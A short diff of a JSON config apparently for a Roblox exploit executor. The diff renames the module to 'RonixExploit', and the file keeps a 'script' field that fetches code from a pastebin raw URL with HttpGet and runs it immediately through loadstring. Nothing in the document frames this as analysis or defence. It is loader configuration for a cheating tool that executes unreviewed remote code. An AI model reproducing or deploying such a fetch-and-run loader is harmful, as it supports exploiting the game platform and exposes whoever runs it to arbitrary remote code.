@@ -1,5 +1,5 @@
 {
-  "moduleName": "Xenith",
+  "moduleName": "RonixExploit",
   "rbxhttp": false,
   "script": "loadstring(game:HttpGet('https://pastebin.com/raw/GHuUpDLp'))()",
   "versionName": "Android"
